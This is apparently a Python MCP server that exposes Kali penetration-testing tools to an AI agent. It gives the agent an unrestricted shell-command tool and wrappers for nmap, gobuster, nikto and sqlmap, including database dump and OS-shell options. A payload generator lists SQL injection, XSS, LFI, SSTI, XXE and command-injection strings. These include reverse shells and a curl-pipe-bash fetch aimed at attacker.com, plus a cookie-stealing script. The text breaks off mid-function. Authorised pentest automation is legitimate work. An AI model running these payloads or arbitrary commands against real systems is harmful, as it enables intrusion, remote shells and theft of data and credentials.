#!/usr/bin/env /home/morningstar/miniconda3/envs/trading_env/bin/python3
"""
Kali MCP Server v3 - Optimized for Advanced Penetration Testing
Enhanced reliability, better error handling, and advanced exploitation capabilities
"""

import asyncio
import subprocess
import json
import logging
import shlex
import tempfile
import os
import re
import datetime
import xml.etree.ElementTree as ET
import hashlib
import base64
import urllib.parse
from typing import Dict, Any, Optional, List, Tuple
from functools import wraps
from dataclasses import dataclass, asdict
from enum import Enum

from fastmcp import FastMCP

# ============================================================================
# CONFIGURATION
# ============================================================================

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TOOL_LOG_DIR = os.path.join(BASE_DIR, "tool_logs")
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
PAYLOADS_DIR = os.path.join(BASE_DIR, "payloads")

os.makedirs(TOOL_LOG_DIR, exist_ok=True)
os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(PAYLOADS_DIR, exist_ok=True)

# Logging configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[
        logging.FileHandler(os.path.join(BASE_DIR, "kali_mcp_server.log")),
        logging.StreamHandler(),
    ],
)
logger = logging.getLogger(__name__)

# Global session
CURRENT_SESSION_ID = None

# ============================================================================
# ENUMS AND DATA CLASSES
# ============================================================================

class ScanIntensity(Enum):
    STEALTH = "stealth"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    AGGRESSIVE = "aggressive"

class VulnerabilityLevel(Enum):
    INFO = "info"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

@dataclass
class ScanResult:
    status: str
    target: str
    findings: List[Dict]
    raw_output: str
    output_file: str
    execution_time: float
    errors: List[str]

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def generate_timestamp() -> str:
    return datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

def sanitize_filename(name: str) -> str:
    """Sanitize string for use as filename"""
    return re.sub(r'[^\w\-.]', '_', name.replace('://', '_').replace('/', '_'))[:100]

def run_command_advanced(
    command: List[str],
    timeout: int = 600,
    env: Optional[Dict] = None,
    cwd: Optional[str] = None,
    shell: bool = False,
    capture_realtime: bool = False
) -> Dict[str, Any]:
    """
    Advanced command execution with better error handling and timeout management
    """
    start_time = datetime.datetime.now()
    
    try:
        logger.info(f"Executing: {' '.join(command) if isinstance(command, list) else command}")
        
        process_env = os.environ.copy()
        if env:
            process_env.update(env)
        
        if shell and isinstance(command, list):
            command = ' '.join(command)
        
        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
            env=process_env,
            cwd=cwd,
            shell=shell
        )
        
        execution_time = (datetime.datetime.now() - start_time).total_seconds()
        
        return {
            "stdout": result.stdout.strip(),
            "stderr": result.stderr.strip(),
            "return_code": result.returncode,
            "execution_time": execution_time,
            "success": result.returncode == 0,
            "command": command if isinstance(command, str) else ' '.join(command)
        }
        
    except subprocess.TimeoutExpired as e:
        logger.error(f"Command timed out after {timeout}s")
        return {
            "stdout": e.stdout.decode() if e.stdout else "",
            "stderr": f"TIMEOUT: Command exceeded {timeout} seconds",
            "return_code": -1,
            "execution_time": timeout,
            "success": False,
            "command": command if isinstance(command, str) else ' '.join(command)
        }
        
    except FileNotFoundError:
        logger.error(f"Command not found: {command[0] if isinstance(command, list) else command.split()[0]}")
        return {
            "stdout": "",
            "stderr": f"Command not found. Ensure the tool is installed.",
            "return_code": -1,
            "execution_time": 0,
            "success": False,
            "command": command if isinstance(command, str) else ' '.join(command)
        }
        
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        return {
            "stdout": "",
            "stderr": str(e),
            "return_code": -1,
            "execution_time": 0,
            "success": False,
            "command": command if isinstance(command, str) else ' '.join(command)
        }

def verify_output(
    file_path: str,
    expected_format: str = "text",
    min_size: int = 10,
    required_patterns: Optional[List[str]] = None
) -> Dict[str, Any]:
    """
    Verify output file exists and contains valid data
    """
    result = {
        "valid": False,
        "file_exists": False,
        "file_size": 0,
        "format_valid": False,
        "has_data": False,
        "error": None
    }
    
    try:
        if not os.path.exists(file_path):
            result["error"] = f"File not found: {file_path}"
            return result
        
        result["file_exists"] = True
        result["file_size"] = os.path.getsize(file_path)
        
        if result["file_size"] < min_size:
            result["error"] = f"File too small ({result['file_size']} bytes)"
            return result
        
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        if not content.strip():
            result["error"] = "File is empty"
            return result
        
        # Format validation
        if expected_format == "xml":
            try:
                ET.fromstring(content)
                result["format_valid"] = True
            except ET.ParseError as e:
                result["error"] = f"Invalid XML: {e}"
                return result
                
        elif expected_format == "json":
            try:
                json.loads(content)
                result["format_valid"] = True
            except json.JSONDecodeError as e:
                result["error"] = f"Invalid JSON: {e}"
                return result
        else:
            result["format_valid"] = True
        
        # Pattern validation
        if required_patterns:
            content_lower = content.lower()
            for pattern in required_patterns:
                if pattern.lower() in content_lower:
                    result["has_data"] = True
                    break
        else:
            result["has_data"] = True
        
        result["valid"] = result["format_valid"] and result["has_data"]
        return result
        
    except Exception as e:
        result["error"] = str(e)
        return result

def log_tool_execution(tool_name: str, inputs: Dict, outputs: Dict):
    """Log tool execution for audit trail"""
    timestamp = generate_timestamp()
    log_file = os.path.join(TOOL_LOG_DIR, f"{tool_name}_{timestamp}.json")
    
    log_data = {
        "tool": tool_name,
        "timestamp": timestamp,
        "session_id": CURRENT_SESSION_ID,
        "inputs": inputs,
        "outputs": outputs
    }
    
    try:
        with open(log_file, 'w') as f:
            json.dump(log_data, f, indent=2, default=str)
        logger.info(f"Logged {tool_name} to {log_file}")
    except Exception as e:
        logger.error(f"Failed to log {tool_name}: {e}")

# ============================================================================
# PAYLOAD GENERATORS
# ============================================================================

class PayloadGenerator:
    """Advanced payload generation for various attack vectors"""
    
    @staticmethod
    def sql_injection_payloads(db_type: str = "generic") -> List[str]:
        """Generate SQL injection payloads"""
        generic = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "' OR 1=1--",
            "' OR 1=1#",
            "admin'--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "' AND 1=1--",
            "' AND 1=2--",
            "'; DROP TABLE users--",
            "' AND SLEEP(5)--",
            "' AND BENCHMARK(10000000,SHA1('test'))--",
            "' WAITFOR DELAY '0:0:5'--",
            "1; EXEC xp_cmdshell('whoami')--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin')--"
        ]
        
        mysql_specific = [
            "' UNION SELECT @@version--",
            "' UNION SELECT user()--",
            "' UNION SELECT database()--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--"
        ]
        
        mssql_specific = [
            "'; EXEC sp_configure 'show advanced options',1--",
            "'; EXEC xp_cmdshell 'dir'--",
            "' UNION SELECT name FROM master..sysdatabases--",
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"
        ]
        
        postgres_specific = [
            "'; SELECT pg_sleep(5)--",
            "' UNION SELECT version()--",
            "' UNION SELECT current_database()--",
            "' UNION SELECT usename FROM pg_user--"
        ]
        
        if db_type == "mysql":
            return generic + mysql_specific
        elif db_type == "mssql":
            return generic + mssql_specific
        elif db_type == "postgres":
            return generic + postgres_specific
        return generic
    
    @staticmethod
    def xss_payloads() -> List[str]:
        """Generate XSS payloads with various bypass techniques"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'>",
            "javascript:alert('XSS')",
            "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
            "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<<script>script>alert('XSS')<</script>/script>",
            "<img src=\"x\" onerror=\"&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;\">",
            "<svg/onload=alert('XSS')>",
            "<math><maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:alert('XSS')\">CLICKME</maction></math>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<video><source onerror=alert('XSS')>"
        ]
    
    @staticmethod
    def lfi_payloads() -> List[str]:
        """Generate LFI payloads with encoding bypasses"""
        return [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....\\/....\\/....\\/etc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
            "/etc/passwd%00",
            "/etc/passwd%00.jpg",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://filter/read=string.rot13/resource=/etc/passwd",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "expect://whoami",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log"
        ]
    
    @staticmethod
    def command_injection_payloads() -> List[str]:
        """Generate command injection payloads"""
        return [
            "; whoami",
            "| whoami",
            "|| whoami",
            "&& whoami",
            "& whoami",
            "`whoami`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; id",
            "| id",
            "; uname -a",
            "| uname -a",
            "; ls -la",
            "| ls -la",
            "; nc -e /bin/sh attacker.com 4444",
            "| nc -e /bin/sh attacker.com 4444",
            "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
            "$(bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1')",
            "; curl http://attacker.com/shell.sh | bash"
        ]
    
    @staticmethod
    def ssti_payloads() -> List[str]:
        """Generate Server-Side Template Injection payloads"""
        return [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "*{7*7}",
            "{{config}}",
            "{{self.__class__.__mro__[2].__subclasses__()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{''.__class__.__bases__[0].__subclasses__()}}",
            "{{config.items()}}",
            "{{request.environ}}",
            "{{lipsum.__globals__['os'].popen('id').read()}}",
            "{{cycler.__init__.__globals__.os.popen('id').read()}}"
        ]
    
    @staticmethod
    def xxe_payloads() -> List[str]:
        """Generate XXE payloads"""
        return [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo></foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]><foo>&xxe;</foo>'
        ]

# ============================================================================
# FASTMCP SERVER
# ============================================================================

mcp = FastMCP("Kali Tools Server v3 - Advanced Pentest Edition")

# Decorator for session reference resolution
def resolve_references(func):
    @wraps(func)
    async def wrapper(*args, **kwargs):
        resolved_kwargs = {}
        for key, value in kwargs.items():
            if isinstance(value, str) and value.startswith("@session:"):
                try:
                    resolved_kwargs[key] = resolve_session_reference(value)
                except Exception as e:
                    logger.warning(f"Could not resolve reference '{value}': {e}")
                    resolved_kwargs[key] = value
            else:
                resolved_kwargs[key] = value
        return await func(*args, **resolved_kwargs)
    return wrapper

def resolve_session_reference(reference: str) -> Any:
    """Resolve session reference to actual value"""
    if not reference.startswith("@session:"):
        return reference
    
    parts = reference.split(":")
    if len(parts) != 3:
        raise ValueError(f"Invalid reference format: {reference}")
    
    _, tool_name, output_key = parts
    
    if not CURRENT_SESSION_ID:
        raise ValueError("No active session")
    
    session_dir = os.path.join(SESSIONS_DIR, CURRENT_SESSION_ID)
    tool_dir = os.path.join(session_dir, tool_name)
    
    if not os.path.exists(tool_dir):
        raise ValueError(f"No output for tool '{tool_name}'")
    
    output_files = sorted([f for f in os.listdir(tool_dir) if f.endswith('.json')], reverse=True)
    if not output_files:
        raise ValueError(f"No output files for '{tool_name}'")
    
    with open(os.path.join(tool_dir, output_files[0]), 'r') as f:
        data = json.load(f)
    
    keys = output_key.split(".")
    value = data
    for key in keys:
        if isinstance(value, dict) and key in value:
            value = value[key]
        elif isinstance(value, list) and key.isdigit():
            value = value[int(key)]
        else:
            raise ValueError(f"Key '{output_key}' not found")
    
    return value

# ============================================================================
# CORE TOOLS
# ============================================================================

@mcp.tool()
async def start_session(session_name: Optional[str] = None) -> str:
    """Start a new pentest session for organized result storage"""
    global CURRENT_SESSION_ID
    
    timestamp = generate_timestamp()
    session_id = f"{session_name}_{timestamp}" if session_name else timestamp
    session_dir = os.path.join(SESSIONS_DIR, session_id)
    os.makedirs(session_dir, exist_ok=True)
    
    CURRENT_SESSION_ID = session_id
    
    result = {
        "status": "success",
        "session_id": session_id,
        "session_dir": session_dir,
        "message": f"Session '{session_id}' started"
    }
    
    return json.dumps(result, indent=2)

@mcp.tool()
async def server_health() -> str:
    """Check server status and available tools"""
    tools = [
        "nmap", "gobuster", "dirb", "nikto", "sqlmap", "msfconsole",
        "hydra", "john", "hashcat", "wpscan", "enum4linux", "amass",
        "dnsrecon", "theharvester", "whatweb", "wfuzz", "ffuf",
        "nuclei", "subfinder", "httpx", "curl", "wget"
    ]
    
    tool_status = {}
    for tool in tools:
        result = run_command_advanced(["which", tool], timeout=5)
        tool_status[tool] = {
            "available": result["success"],
            "path": result["stdout"] if result["success"] else None
        }
    
    available = [t for t, s in tool_status.items() if s["available"]]
    missing = [t for t, s in tool_status.items() if not s["available"]]
    
    result = {
        "status": "ok",
        "available_tools": available,
        "missing_tools": missing,
        "total_available": len(available),
        "total_missing": len(missing),
        "session_active": CURRENT_SESSION_ID is not None,
        "current_session": CURRENT_SESSION_ID
    }
    
    return json.dumps(result, indent=2)

@mcp.tool()
@resolve_references
async def execute_command(
    command: str,
    timeout: int = 600,
    working_dir: Optional[str] = None
) -> str:
    """Execute arbitrary shell command with enhanced error handling"""
    inputs = {"command": command, "timeout": timeout, "working_dir": working_dir}
    
    result = run_command_advanced(
        command,
        timeout=timeout,
        cwd=working_dir,
        shell=True
    )
    
    output = {
        "status": "success" if result["success"] else "failed",
        "command": command,
        "stdout": result["stdout"],
        "stderr": result["stderr"],
        "return_code": result["return_code"],
        "execution_time": result["execution_time"]
    }
    
    log_tool_execution("execute_command", inputs, output)
    return json.dumps(output, indent=2)


# ============================================================================
# NETWORK RECONNAISSANCE TOOLS
# ============================================================================

@mcp.tool()
@resolve_references
async def nmap_scan(
    target: str,
    scan_type: str = "comprehensive",
    ports: Optional[str] = None,
    scripts: Optional[str] = None,
    intensity: str = "medium",
    output_file: Optional[str] = None,
    additional_args: str = "",
    timeout: int = 900
) -> str:
    """
    Advanced Nmap scanning with optimized profiles for penetration testing
    
    Scan types:
    - quick: Fast scan of top 100 ports
    - basic: Service version detection on top 1000 ports
    - comprehensive: Full port scan with scripts and OS detection
    - stealth: SYN scan with timing evasion
    - vuln: Vulnerability scanning with NSE scripts
    - udp: UDP port scanning
    - aggressive: All-out scan with maximum detection
    """
    inputs = {
        "target": target, "scan_type": scan_type, "ports": ports,
        "scripts": scripts, "intensity": intensity, "timeout": timeout
    }
    
    # Scan profiles optimized for different scenarios
    scan_profiles = {
        "quick": ["-F", "-T4", "--open"],
        "basic": ["-sV", "-sC", "-T3"],
        "comprehensive": ["-sV", "-sC", "-O", "-A", "--version-all"],
        "stealth": ["-sS", "-T2", "-f", "--data-length", "50"],
        "vuln": ["-sV", "--script=vuln,exploit,auth", "-T3"],
        "udp": ["-sU", "-sV", "--top-ports", "100", "-T4"],
        "aggressive": ["-sS", "-sV", "-sC", "-O", "-A", "-T4", "--script=default,vuln"]
    }
    
    intensity_timing = {
        "stealth": "-T1",
        "low": "-T2", 
        "medium": "-T3",
        "high": "-T4",
        "aggressive": "-T5"
    }
    
    if scan_type not in scan_profiles:
        return json.dumps({"status": "error", "message": f"Invalid scan_type. Choose from: {list(scan_profiles.keys())}"})
    
    # Build output path
    if not output_file:
        timestamp = generate_timestamp()
        output_file = os.path.join(TOOL_LOG_DIR, f"nmap_{sanitize_filename(target)}_{timestamp}.xml")
    
    # Build command
    cmd = ["nmap"] + scan_profiles[scan_type]
    
    # Add timing
    if intensity in intensity_timing and "-T" not in str(scan_profiles[scan_type]):
        cmd.append(intensity_timing[intensity])
    
    # Add ports
    if ports:
        cmd.extend(["-p", ports])
    elif scan_type == "comprehensive":
        cmd.extend(["-p-"])  # All ports for comprehensive
    
    # Add scripts
    if scripts:
        cmd.extend(["--script", scripts])
    
    # Output format
    cmd.extend(["-oX", output_file, "-oN", output_file.replace(".xml", ".txt")])
    
    # Additional args
    if additional_args:
        cmd.extend(shlex.split(additional_args))
    
    cmd.append(target)
    
    # Execute
    result = run_command_advanced(cmd, timeout=timeout)
    
    # Parse results
    parsed_data = {"hosts": [], "ports": [], "services": [], "os_matches": [], "scripts": []}
    
    if os.path.exists(output_file):
        try:
            with open(output_file, 'r') as f:
                content = f.read()
            
            root = ET.fromstring(content)
            
            for host in root.findall("host"):
                host_info = {
                    "addresses": [],
                    "hostnames": [],
                    "ports": [],
                    "os": [],
                    "status": "unknown"
                }
                
                # Status
                status = host.find("status")
                if status is not None:
                    host_info["status"] = status.get("state", "unknown")
                
                # Addresses
                for addr in host.findall("address"):
                    host_info["addresses"].append({
                        "addr": addr.get("addr"),
                        "type": addr.get("addrtype")
                    })
                
                # Hostnames
                for hostname in host.findall("hostnames/hostname"):
                    host_info["hostnames"].append(hostname.get("name"))
                
                # Ports
                for port in host.findall("ports/port"):
                    port_info = {
                        "port": port.get("portid"),
                        "protocol": port.get("protocol"),
                        "state": "unknown",
                        "service": "unknown",
                        "product": None,
                        "version": None,
                        "scripts": []
                    }
                    
                    state = port.find("state")
                    if state is not None:
                        port_info["state"] = state.get("state")
                    
                    service = port.find("service")
                    if service is not None:
                        port_info["service"] = service.get("name", "unknown")
                        port_info["product"] = service.get("product")
                        port_info["version"] = service.get("version")
                        port_info["extrainfo"] = service.get("extrainfo")
                    
                    # Scripts
                    for script in port.findall("script"):
                        port_info["scripts"].append({
                            "id": script.get("id"),
                            "output": script.get("output", "")[:500]
                        })
                    
                    host_info["ports"].append(port_info)
                    
                    if port_info["state"] == "open":
                        parsed_data["ports"].append(f"{port_info['port']}/{port_info['protocol']}")
                        parsed_data["services"].append({
                            "port": port_info["port"],
                            "service": port_info["service"],
                            "product": port_info["product"],
                            "version": port_info["version"]
                        })
                
                # OS Detection
                for osmatch in host.findall("os/osmatch"):
                    os_info = {
                        "name": osmatch.get("name"),
                        "accuracy": osmatch.get("accuracy")
                    }
                    host_info["os"].append(os_info)
                    parsed_data["os_matches"].append(os_info)
                
                parsed_data["hosts"].append(host_info)
                
        except ET.ParseError as e:
            logger.error(f"Failed to parse Nmap XML: {e}")
    
    # Build response
    open_ports = [p for h in parsed_data["hosts"] for p in h["ports"] if p["state"] == "open"]
    
    output = {
        "status": "success" if result["success"] else "partial",
        "target": target,
        "scan_type": scan_type,
        "output_file": output_file,
        "execution_time": result["execution_time"],
        "summary": {
            "hosts_up": len([h for h in parsed_data["hosts"] if h["status"] == "up"]),
            "open_ports": len(open_ports),
            "services_detected": len(parsed_data["services"])
        },
        "open_ports": parsed_data["ports"],
        "services": parsed_data["services"],
        "os_detection": parsed_data["os_matches"],
        "hosts": parsed_data["hosts"],
        "raw_output": result["stdout"][:2000] if result["stdout"] else "",
        "errors": result["stderr"] if result["stderr"] else None
    }
    
    log_tool_execution("nmap_scan", inputs, output)
    return json.dumps(output, indent=2)

# ============================================================================
# WEB APPLICATION SCANNING
# ============================================================================

@mcp.tool()
@resolve_references
async def gobuster_scan(
    url: str,
    mode: str = "dir",
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    extensions: str = "php,html,txt,js,json,xml,bak,old,asp,aspx",
    threads: int = 20,
    status_codes: str = "200,204,301,302,307,401,403",
    output_file: Optional[str] = None,
    additional_args: str = "",
    timeout: int = 600
) -> str:
    """
    Advanced directory/DNS/vhost enumeration with Gobuster
    
    Modes:
    - dir: Directory/file enumeration
    - dns: DNS subdomain enumeration
    - vhost: Virtual host enumeration
    - fuzz: Fuzzing mode
    """
    inputs = {
        "url": url, "mode": mode, "wordlist": wordlist,
        "extensions": extensions, "threads": threads
    }
    
    if not output_file:
        timestamp = generate_timestamp()
        output_file = os.path.join(TOOL_LOG_DIR, f"gobuster_{mode}_{sanitize_filename(url)}_{timestamp}.txt")
    
    cmd = ["gobuster", mode]
    
    if mode == "dir":
        cmd.extend(["-u", url, "-w", wordlist])
        if extensions:
            cmd.extend(["-x", extensions])
        cmd.extend(["-s", status_codes])
        cmd.extend(["--no-error", "-q"])
    elif mode == "dns":
        cmd.extend(["-d", url, "-w", wordlist])
    elif mode == "vhost":
        cmd.extend(["-u", url, "-w", wordlist])
    elif mode == "fuzz":
        cmd.extend(["-u", url, "-w", wordlist])
    
    cmd.extend([
        "-t", str(threads),
        "-o", output_file,
        "--timeout", "10s",
        "--delay", "50ms"
    ])
    
    if additional_args:
        cmd.extend(shlex.split(additional_args))
    
    result = run_command_advanced(cmd, timeout=timeout)
    
    # Parse results
    findings = []
    if os.path.exists(output_file):
        try:
            with open(output_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('='):
                        # Parse gobuster output format
                        match = re.search(r'(/\S+)\s+\(Status:\s*(\d+)\)', line)
                        if match:
                            findings.append({
                                "path": match.group(1),
                                "status": int(match.group(2)),
                                "raw": line
                            })
                        elif line.startswith('/') or 'http' in line.lower():
                            findings.append({"path": line, "raw": line})
        except Exception as e:
            logger.error(f"Error parsing gobuster output: {e}")
    
    # Categorize findings
    interesting = [f for f in findings if f.get("status") in [200, 301, 302]]
    auth_required = [f for f in findings if f.get("status") in [401, 403]]
    
    output = {
        "status": "success" if result["success"] else "partial",
        "target": url,
        "mode": mode,
        "wordlist": wordlist,
        "output_file": output_file,
        "execution_time": result["execution_time"],
        "summary": {
            "total_found": len(findings),
            "interesting": len(interesting),
            "auth_required": len(auth_required)
        },
        "findings": findings[:100],  # Limit output
        "interesting_paths": [f["path"] for f in interesting],
        "auth_required_paths": [f["path"] for f in auth_required],
        "errors": result["stderr"] if result["stderr"] else None
    }
    
    log_tool_execution("gobuster_scan", inputs, output)
    return json.dumps(output, indent=2)

@mcp.tool()
@resolve_references
async def nikto_scan(
    target: str,
    tuning: str = "x6",
    plugins: Optional[str] = None,
    output_file: Optional[str] = None,
    ssl: bool = False,
    timeout: int = 900
) -> str:
    """
    Web server vulnerability scanning with Nikto
    
    Tuning options:
    - 0: File Upload
    - 1: Interesting File / Seen in logs
    - 2: Misconfiguration / Default File
    - 3: Information Disclosure
    - 4: Injection (XSS/Script/HTML)
    - 5: Remote File Retrieval - Inside Web Root
    - 6: Denial of Service
    - 7: Remote File Retrieval - Server Wide
    - 8: Command Execution / Remote Shell
    - 9: SQL Injection
    - a: Authentication Bypass
    - b: Software Identification
    - c: Remote Source Inclusion
    - x: Reverse Tuning Options (exclude)
    """
    inputs = {"target": target, "tuning": tuning, "plugins": plugins, "ssl": ssl}
    
    if not output_file:
        timestamp = generate_timestamp()
        output_file = os.path.join(TOOL_LOG_DIR, f"nikto_{sanitize_filename(target)}_{timestamp}.xml")
    
    cmd = ["nikto", "-h", target, "-Format", "xml", "-o", output_file]
    
    if tuning:
        cmd.extend(["-Tuning", tuning])
    
    if plugins:
        cmd.extend(["-Plugins", plugins])
    
    if ssl or target.startswith("https"):
        cmd.append("-ssl")
    
    cmd.extend(["-timeout", "10", "-maxtime", str(timeout - 60)])
    
    result = run_command_advanced(cmd, timeout=timeout)
    
    # Parse XML results
    vulnerabilities = []
    if os.path.exists(output_file):
        try:
            with open(output_file, 'r') as f:
                content = f.read()
            
            root = ET.fromstring(content)
            
            for item in root.findall(".//item"):
                vuln = {
                    "id": item.get("id"),
                    "osvdb": item.get("osvdb"),
                    "method": item.get("method"),
                    "uri": None,
                    "description": None,
                    "references": []
                }
                
                uri = item.find("uri")
                if uri is not None:
                    vuln["uri"] = uri.text
                
                desc = item.find("description")
                if desc is not None:
                    vuln["description"] = desc.text
                
                for ref in item.findall("references/reference"):
                    vuln["references"].append(ref.text)
                
                vulnerabilities.append(vuln)
                
        except ET.ParseError as e:
            logger.error(f"Failed to parse Nikto XML: {e}")
    
    # Categorize by severity
    critical = [v for v in vulnerabilities if any(k in str(v.get("description", "")).lower() for k in ["rce", "command execution", "sql injection", "remote code"])]
    high = [v for v in vulnerabilities if any(k in str(v.get("description", "")).lower() for k in ["xss", "injection", "bypass", "disclosure"])]
    
    output = {
        "status": "success" if result["success"] else "partial",
        "target": target,
        "output_file": output_file,
        "execution_time": result["execution_time"],
        "summary": {
            "total_findings": len(vulnerabilities),
            "critical": len(critical),
            "high": len(high)
        },
        "vulnerabilities": vulnerabilities[:50],
        "critical_findings": critical,
        "high_findings": high,
        "errors": result["stderr"] if result["stderr"] else None
    }
    
    log_tool_execution("nikto_scan", inputs, output)
    return json.dumps(output, indent=2)


# ============================================================================
# SQL INJECTION TOOLS
# ============================================================================

@mcp.tool()
@resolve_references
async def sqlmap_scan(
    url: str,
    data: Optional[str] = None,
    method: str = "GET",
    param: Optional[str] = None,
    dbms: Optional[str] = None,
    level: int = 3,
    risk: int = 2,
    technique: str = "BEUSTQ",
    dump: bool = False,
    tables: bool = False,
    dbs: bool = False,
    os_shell: bool = False,
    tamper: Optional[str] = None,
    output_dir: Optional[str] = None,
    timeout: int = 1200
) -> str:
    """
    Advanced SQL injection testing with SQLMap
    
    Techniques:
    - B: Boolean-based blind
    - E: Error-based
    - U: Union query-based
    - S: Stacked queries
    - T: Time-based blind
    - Q: Inline queries
    
    Tamper scripts (examples):
    - space2comment: Replace spaces with comments
    - between: Replace > with BETWEEN
    - randomcase: Random case for keywords
    - charencode: URL encode characters
    - base64encode: Base64 encode payload
    """
    inputs = {
        "url": url, "data": data, "method": method, "param": param,
        "dbms": dbms, "level": level, "risk": risk, "technique": technique,
        "dump": dump, "tables": tables, "dbs": dbs, "tamper": tamper
    }
    
    if not output_dir:
        timestamp = generate_timestamp()
        output_dir = os.path.join(TOOL_LOG_DIR, f"sqlmap_{sanitize_filename(url)}_{timestamp}")
    
    os.makedirs(output_dir, exist_ok=True)
    
    cmd = [
        "sqlmap",
        "-u", url,
        "--batch",
        "--output-dir", output_dir,
        f"--level={level}",
        f"--risk={risk}",
        f"--technique={technique}",
        "--threads=4",
        "--random-agent"
    ]
    
    if data:
        cmd.extend(["--data", data])
    
    if method.upper() == "POST":
        cmd.append("--method=POST")
    
    if param:
        cmd.extend(["-p", param])
    
    if dbms:
        cmd.extend(["--dbms", dbms])
    
    if tamper:
        cmd.extend(["--tamper", tamper])
    
    if dbs:
        cmd.append("--dbs")
    
    if tables:
        cmd.append("--tables")
    
    if dump:
        cmd.append("--dump")
    
    if os_shell:
        cmd.append("--os-shell")
    
    result = run_command_advanced(cmd, timeout=timeout)
    
    # Analyze results
    vulnerable = False
    injection_points = []
    databases = []
    tables_found = []
    
    stdout = result["stdout"].lower()
    
    # Check for vulnerability indicators
    vuln_indicators = [
        "sqlmap identified the following injection point",
        "parameter: ",
        "type: ",
        "title: ",
        "payload: ",
        "injectable",
        "is vulnerable"
    ]
    
    for indicator in vuln_indicators:
        if indicator in stdout:
            vulnerable = True
            break
    
    # Extract injection details
    lines = result["stdout"].split('\n')
    current_injection = {}
    
    for line in lines:
        line_stripped = line.strip()
        
        if "Parameter:" in line:
            if current_injection:
                injection_points.append(current_injection)
            current_injection = {"parameter": line_stripped.split("Parameter:")[-1].strip()}
        elif "Type:" in line and current_injection:
            current_injection["type"] = line_stripped.split("Type:")[-1].strip()
        elif "Title:" in line and current_injection:
            current_injection["title"] = line_stripped.split("Title:")[-1].strip()
        elif "Payload:" in line and current_injection:
            current_injection["payload"] = line_stripped.split("Payload:")[-1].strip()
        elif "available databases" in line.lower():
            # Extract database names
            pass
    
    if current_injection:
        injection_points.append(current_injection)
    
    # Check for dumped data
    dumped_files = []
    if os.path.exists(output_dir):
        for root, dirs, files in os.walk(output_dir):
            for file in files:
                if file.endswith(('.csv', '.txt', '.dump')):
                    dumped_files.append(os.path.join(root, file))
    
    output = {
        "status": "success" if result["success"] else "partial",
        "target": url,
        "vulnerable": vulnerable,
        "output_dir": output_dir,
        "execution_time": result["execution_time"],
        "summary": {
            "is_vulnerable": vulnerable,
            "injection_points": len(injection_points),
            "databases_found": len(databases),
            "dumped_files": len(dumped_files)
        },
